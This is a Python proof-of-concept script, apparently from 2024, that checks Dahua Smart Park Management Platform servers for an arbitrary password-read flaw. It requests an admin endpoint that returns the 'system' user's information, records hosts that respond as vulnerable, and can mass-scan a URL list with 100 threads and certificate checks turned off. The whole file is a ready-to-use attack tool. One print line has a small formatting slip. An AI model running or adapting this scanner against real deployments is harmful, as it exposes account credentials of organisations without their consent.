import sys, argparse, requests, re
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool
def banner():
    test = """
 _      _  _      ____  ____  _     ____  _    
/ \__/|/ \/ \__/|/  _ \/  _ \/ \ /\/  _ \/ \ /\
| |\/||| || |\/||| / \|| | \|| | ||| / \|| | ||
| |  ||| || |  ||| |-||| |_/|| \_/|| \_\|| \_/|
\_/  \|\_/\_/  \|\_/ \|\____/\____/\____\\____/       
                                   author:sanhua
                                   date:2024-09-03
                                   version:1.0
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="大华智慧园区管理平台任意密码读取")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    if not target:
        print("目标 URL 不能为空")
        return
    print(f"正在测试 {target} 是否存在任意密码读取...")
    payload = '/admin/user_getUserInfoByUserName.action?userName=system'
    try:
        res = requests.get(url=target+payload,verify=False, timeout=15)
        if res.status_code == 200 and 'system' in res.text:
            print("f{target} 存在任意密码读取漏洞")
            with open("result2.txt", 'a', encoding='utf-8') as f:
                f.write(target + '\n')
        else:
            print(f"{target} 不存在任意密码读取漏洞")
    except Exception as e:
        print(f"{target} 任意密码读取漏洞检测失败: {e}")


if __name__ == '__main__':
    main()